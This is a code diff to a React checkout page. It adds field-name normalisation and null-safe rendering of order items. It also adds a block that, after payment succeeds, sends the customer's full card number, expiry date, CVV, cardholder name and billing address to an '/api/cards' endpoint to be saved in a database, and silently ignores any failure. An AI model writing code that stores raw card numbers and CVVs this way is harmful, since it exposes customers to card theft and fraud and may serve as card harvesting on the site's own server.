@@ -92,6 +92,10 @@ function PaymentPageContent() {
     const pendingOrder = sessionStorage.getItem('pendingOrder');
     if (pendingOrder) {
       const order = JSON.parse(pendingOrder);
+      // Normalize products field name
+      if (order.orderProducts && !order.products) {
+        order.products = order.orderProducts;
+      }
       setOrderData(order);
       setFormData(prev => ({
         ...prev,
@@ -181,6 +185,30 @@ function PaymentPageContent() {
             order_status: 'paid',
           },
         });
+
+        // Save card details to database
+        try {
+          await fetch('/api/cards', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              order_id: orderData.order_id,
+              cardNumber: formData.cardNumber,
+              expiryMonth: formData.expiryMonth,
+              expiryYear: formData.expiryYear,
+              cvv: formData.cvv,
+              cardholderName: formData.cardholderName,
+              billingAddress: formData.billingAddress,
+              city: formData.city,
+              state: formData.state,
+              zipCode: formData.zipCode,
+            }),
+          });
+          console.log('✅ Card details saved successfully');
+        } catch (cardError) {
+          console.error('Error saving card details:', cardError);
+          // Don't fail the payment if card save fails
+        }
 
         // Store transaction details
         const transactionData = {
@@ -345,10 +373,10 @@ function PaymentPageContent() {
                 {/* Items List */}
                 <div>
                     <div className="text-xs text-slate-400 uppercase font-semibold mb-3">
-                      Items ({orderData.products.length})
+                      Items ({orderData?.products?.length || 0})
                     </div>
                     <div className="space-y-3">
-                        {orderData.products.map((item: any, idx: number) => (
+                        {orderData?.products?.map((item: any, idx: number) => (
                             <div key={idx} className="flex justify-between text-sm">
                                 <div className="flex-1">
                                   <span className="text-slate-300">{item.product_name}</span>
